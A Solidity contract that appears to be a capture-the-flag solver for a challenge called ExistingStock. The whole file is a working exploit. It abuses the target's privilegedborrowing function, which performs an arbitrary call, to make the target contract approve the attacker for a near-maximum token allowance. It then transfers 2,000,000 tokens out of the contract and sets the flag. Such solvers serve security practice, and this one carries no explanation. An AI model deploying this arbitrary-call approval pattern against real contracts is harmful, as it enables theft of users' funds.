pragma solidity ^0.8.0;

import {IExistingStock} from "./IExistingStock.sol";
import "forge-std/console.sol";

contract ExistingStockSolver {
    IExistingStock public stock;
    address user;

    constructor(address stock_) {
        stock = IExistingStock(stock_);
        user = msg.sender;
    }

    function solve() public {
        bytes memory data = abi.encodeWithSignature("callBack1()");
        stock.privilegedborrowing(1000, user, address(this), data);
        stock.setflag();
    }

    function callBack1() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max - 1
        );
        stock.privilegedborrowing(1, user, address(stock), data);
        stock.transferFrom(address(stock), address(this), 2000000);
    }
}
